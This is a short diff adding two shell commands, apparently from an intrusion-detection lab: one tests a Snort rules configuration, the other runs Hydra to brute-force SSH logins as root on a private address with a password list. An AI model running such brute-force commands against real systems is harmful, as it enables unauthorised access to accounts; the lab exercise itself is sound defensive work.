@@ -1,0 +1,2 @@
+sudo snort -T -c /etc/nsm/rules/local.rules
+hydra -l root -P /home/wj/password.txt ssh://172.16.18.28
